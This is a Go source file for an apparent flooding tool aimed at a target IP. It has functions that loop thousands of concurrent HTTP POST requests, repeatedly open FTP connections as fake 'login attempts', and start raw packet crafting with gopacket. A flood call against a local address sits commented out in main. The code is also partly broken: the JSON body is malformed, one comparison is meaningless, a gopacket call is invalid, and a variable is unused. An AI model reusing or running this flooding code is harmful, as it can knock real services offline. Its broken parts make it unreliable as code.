package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	ftp "github.com/jlaffaye/ftp"
)

func floodPort(targetfunction func(string), tarIP string) {
	for i := 0; i < 1000; i++ {
		go targetfunction(tarIP)
		go targetfunction(tarIP)
		go targetfunction(tarIP)
		targetfunction(tarIP)
		fmt.Println("Executed ", i, " Proccess")
	}
}

func spamFTP(nrThread int, targetIP string) {
	for i := 0; i < 1000; i++ {
		c, err := ftp.Dial(targetIP, ftp.DialWithTimeout(5*time.Second))
		if err != nil {
			log.Fatal(err)
		}
		//err = c.Login("login", "password")
		//if err != nil {
		//		log.Fatal(err)
		//	}
		// Do something with the FTP conn

		//if err := c.Quit(); err != nil {
		//	log.Fatal(err)
		//}
		if c != c {
			fmt.Println(c)
		}

		fmt.Println("login attempt ", i, " From thread nr ", nrThread)
	}
}

func attackHTTP(httpReq string) {
	// Get request URL
	reqURL, _ := url.Parse(httpReq)

	// Create request body
	reqBody := ioutil.NopCloser(strings.NewReader(`
					{
							"name":"test",
							"salary","123",
							"age","23"
					}
	`))

	// Create a request object
	req := &http.Request{
		Method: "POST",
		URL:    reqURL,
		Header: map[string][]string{
			"Content-Type": {"application/json; charset=UTF-8"},
		},
		Body: reqBody,
	}
	// Send an HTTP request using `req` object
	res, err := http.DefaultClient.Do(req)

	// Chec for response error
	if err != nil {
		log.Fatal("Error:", err)
	}

	// Read response body
	data, _ := ioutil.ReadAll(res.Body)

	// Close response body
	res.Body.Close()

	// Print response status and body
	fmt.Printf("status: %d\n", res.StatusCode)
	fmt.Printf("body: %s\n", data)

}

func main() {
	fmt.Println("Initiating...")
	//const ipTarget = "http://192.168.0.107"
	//floodPort(attackHTTP, ipTarget)

	ip := &layers.IPv4{
		SrcIP: net.IP{1, 2, 3, 4},
		DstIP: net.IP{5, 6, 7, 8},
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	err := ip.SerializeTo(buf, opts)
	if err != nil {
		panic(err)
	}
	fmt.Println(buf.Bytes())
	gopacket.SerializableLayer(buf, opts,
		&layers.Ethernet{},
		&layers.IPv4{},
		&layers.TCP{},
		gopacket.Payload([]byte{1, 2, 3, 4}))
	packetData := buf.Bytes()

}
